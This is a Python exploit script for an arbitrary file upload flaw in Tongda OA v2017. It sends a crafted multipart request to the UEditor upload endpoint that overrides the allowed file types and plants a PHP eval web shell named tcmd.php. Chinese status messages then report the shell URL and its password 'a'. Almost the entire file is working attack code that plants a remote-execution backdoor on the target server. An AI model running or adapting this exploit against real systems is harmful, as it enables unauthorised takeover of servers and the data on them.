import time
import requests
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Go-http-client/1.1",
        "X_requested_with":"XMLHttpRequest",
        "Accept-Encoding":"gzip",
        "Content-Type":"multipart/form-data; boundary=---------------------------55719851240137822763221368724"
        }
    headerx = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
    data='''-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileFieldName]"

fff
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileMaxSize]"

1000000000
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[filePathFormat]"

tcmd
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"

.php
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="ffff"; filename="test.php"
Content-Type: application/octet-stream

<?php eval($_REQUEST['a']);?>
-----------------------------55719851240137822763221368724
Content-Disposition: form-data; name="mufile"

submit
-----------------------------55719851240137822763221368724--
'''
    upload_url=target_url+'module/ueditor/php/action_upload.php?action=uploadfile'
    exp_url=target_url+'tcmd.php'
    console.print(now_time() + " [INFO]     正在检测通达OA v2017 action_upload任意文件上传漏洞", style='bold blue')
    url = target_url + 'inc/expired.php'
    try:
        requests.packages.urllib3.disable_warnings()
        upload = requests.post(upload_url, headers=headers, data=data, verify=False)
        response = requests.get(url, headers=headers, timeout=5, verify=False)
        if upload.status_code == 200 and '2017' in response.text:
            console.print(now_time() + ' [SUCCESS]  通达OA v2017 上传webshell成功，请手动检测wbshell 默认密码为a:', style='bold green')
            console.print(now_time() + ' [SUCCESS]  {}'.format(exp_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  通达OA v2017 action_upload任意文件上传漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')

